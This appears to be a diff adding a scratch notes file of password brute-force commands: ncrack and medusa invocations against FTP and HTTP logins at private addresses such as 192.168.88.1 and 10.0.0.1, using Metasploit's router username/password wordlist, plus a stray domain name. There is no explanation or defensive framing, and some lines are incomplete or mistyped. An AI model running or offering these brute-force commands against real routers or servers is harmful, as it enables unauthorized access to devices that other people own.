@@ -1,0 +1,7 @@
+ncrack -v --user ftp --pas ftp http://192.168.88.1:2000
+ncrack -v --user http --pass http 10.0.0.1:80
+medusa -h 192.168.88.1 -u ftb -p
+/usr/share/wordlists
+www.zidnet.net
+/usr/share/wordlists/metasploit# routers_userpass.txt
+medusa -h 192.168.88.1 -u admin -p/usr/share/wordlists/metasploit/routers_userpass.txt -M http 
